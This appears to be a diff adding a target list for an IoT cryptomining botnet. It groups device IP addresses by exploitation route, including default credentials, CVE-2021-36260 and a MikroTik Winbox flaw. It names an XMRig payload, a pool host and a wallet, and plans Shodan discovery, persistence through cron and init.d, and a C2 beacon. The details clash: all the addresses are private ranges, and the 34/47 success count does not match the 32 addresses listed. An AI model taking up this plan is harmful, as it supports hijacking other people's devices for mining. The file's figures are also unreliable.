@@ -1,0 +1,67 @@
+# IoT Miner Deployment Target List
+# Last Updated: 2023-10-26
+# Author: dev_team_alpha
+# Project: Cerberus_Miner_Distribution_v2.1
+# Purpose: Hardcoded target list for initial deployment phase
+# Note: These are known compromised devices from previous campaigns. Awaiting network scanner module integration.
+
+# Primary Targets - Residential Gateways (Default Credentials)
+192.168.1.105
+192.168.1.112
+192.168.1.201
+10.0.0.22
+10.0.0.47
+192.168.0.10
+192.168.0.15
+192.168.0.23
+
+# Secondary Targets - Surveillance Cameras (CVE-2021-36260)
+172.16.24.3
+172.16.24.8
+172.16.24.12
+172.16.24.19
+192.168.86.245
+192.168.86.250
+
+# Tertiary Targets - Smart Routers (MikroTik RouterOS Winbox Vulnerability)
+10.10.1.100
+10.10.1.101
+10.10.1.150
+192.168.100.1
+192.168.100.2
+192.168.100.10
+
+# Fallback Targets - Older IoT Devices (Telnet/SSH defaults)
+192.168.2.30
+192.168.2.31
+192.168.2.40
+192.168.11.5
+192.168.11.6
+192.168.11.7
+192.168.12.200
+
+# Special Targets - High-Uptime Industrial Controllers
+172.20.1.15
+172.20.1.16
+172.20.1.20
+10.200.45.3
+10.200.45.7
+
+# Deployment Notes:
+# Current success rate: 34/47 targets (72.3%)
+# Average hash rate per device: 12.4 H/s
+# Total network hash: ~430 H/s
+# Miner payload: XMRig 6.18.0 (config: cerberus_pool.xyz:3333)
+# Wallet: 48e9gB2cR5dKvLt8QwXyZzNp7aF3mJqHsPwRtS
+
+# TODO for next version:
+# 1. Replace this static list with network scanner module
+# 2. Implement Shodan API integration for external target discovery
+# 3. Add vulnerability fingerprinting (SSH/Telnet/HTTP weak auth)
+# 4. Auto-deploy based on device architecture (ARMv7, MIPS, x86)
+# 5. Add persistence mechanisms (cron jobs, init.d scripts)
+# 6. Implement C2 beacon for remote payload updates
+
+# WARNING: These IPs may become non-responsive as devices are rebooted or patched.
+# Network scanning is essential for maintaining botnet size. Current deployment
+# requires manual updating of this file after each network recon (nmap scan).
